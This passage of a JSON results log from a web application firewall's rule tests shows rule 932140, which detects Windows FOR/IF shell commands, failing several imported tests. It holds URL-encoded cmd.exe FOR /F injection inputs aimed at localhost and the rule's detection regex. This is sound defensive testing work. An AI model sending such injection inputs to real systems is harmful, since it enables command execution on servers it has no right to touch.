          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 51,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 51,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%25G+IN+%28%27%22C%3A%5Cprogram+Files%5Ccommand.exe%22%27%29+DO+ECHO+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 52,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 52,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%25%25G+IN+%28%27%22C%3A%5Cprogram+Files%5Ccommand.exe%22%27%29+DO+ECHO+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 53,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932271 - Remote Command Execution: Unix Shell Expression Found", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 53,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22tokens%3D1%2C2%2A+delims%3D%2C%22+%25%25+IN+%28C%3A%5CMyDocu%7E1%5Cmytex%7E1.txt%29+DO+ECHO+%25%25",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 54,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932271 - Remote Command Execution: Unix Shell Expression Found", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 54,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22tokens%3D1%2C2%2A+delims%3D%2C%22+%25%25G+IN+%28C%3A%5CMyDocu%7E1%5Cmytex%7E1.txt%29+DO+ECHO+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
